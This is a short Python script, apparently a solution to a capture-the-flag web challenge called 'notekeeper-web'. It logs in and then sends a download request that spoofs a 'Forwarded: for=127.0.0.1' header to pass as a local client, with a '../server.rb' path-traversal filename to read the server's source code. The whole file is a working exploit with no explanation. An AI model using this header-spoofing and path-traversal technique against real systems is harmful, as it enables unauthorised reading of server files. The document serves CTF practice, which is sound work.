import requests

url = "https://notekeeper-web.challs.csc.tf/"
# url = "http://localhost:1337/"

session = requests.Session()
session.post(url + "login", data={"username": "urmom", "password": "urmom"})
resp = session.post(
	url + "download",
	headers={"Forwarded": "for=127.0.0.1"},
	data={"filename": "../server.rb"},
)
print(resp)
print(resp.text)
